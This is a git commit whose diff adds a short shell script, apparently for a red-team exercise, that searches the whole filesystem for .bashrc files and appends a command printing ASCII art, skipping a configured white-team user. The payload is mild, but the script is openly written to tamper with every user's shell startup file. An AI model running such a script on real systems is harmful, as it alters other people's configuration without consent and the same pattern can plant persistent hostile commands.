5e2dd5bd4837fa8f2ef64f51464f0b3742151cee
0xd355a <odessarybski@gmail.com>
2026-03-04 11:47:09 -0500

    bashrc vandalism

---
+++ odessa/vandalize-bashrc.sh
@@ -0,0 +1,15 @@
+
+whiteteam_user=""
+
+find / -name ".bashrc" 2>/dev/null | while read -r bashrc; do
+    [[ -n "$whiteteam_user" && "$bashrc" == *"$whiteteam_user"* ]] && continue
+    echo '
+echo '"'"'
+    ____
+  _|___ \
+ (_) __) |
+    |__ <
+  _ ___) |
+ (_)____/
+'"'"'' >> "$bashrc"
+done
